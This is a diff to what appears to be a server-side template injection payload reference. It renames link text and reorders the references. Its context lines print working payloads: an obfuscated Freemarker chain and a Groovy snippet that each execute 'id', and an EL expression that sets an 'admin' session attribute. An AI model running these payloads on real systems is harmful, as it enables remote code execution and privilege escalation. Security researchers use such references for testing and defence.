@@ -124,7 +124,7 @@ Chaining `lower_abc` to perform code execution (command: `id`):
 ${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
 ```
 
-Reference and explanation of payload can be found [here](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ### Freemarker - Sandbox Bypass
 
@@ -321,7 +321,7 @@ Execute system command (command: `id`):
 ${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
 ```
 
-Reference and explanation of payload can be found [here](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ### Groovy - Sandbox Bypass
 
@@ -408,16 +408,16 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 
 ## References
 
-- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
-- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
-- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
-- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
 - [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
 - [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
 - [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
 - [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
 - [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
 - [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
 - [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
-- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - YesWeHack, Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
+- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
+- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
+- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
+- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
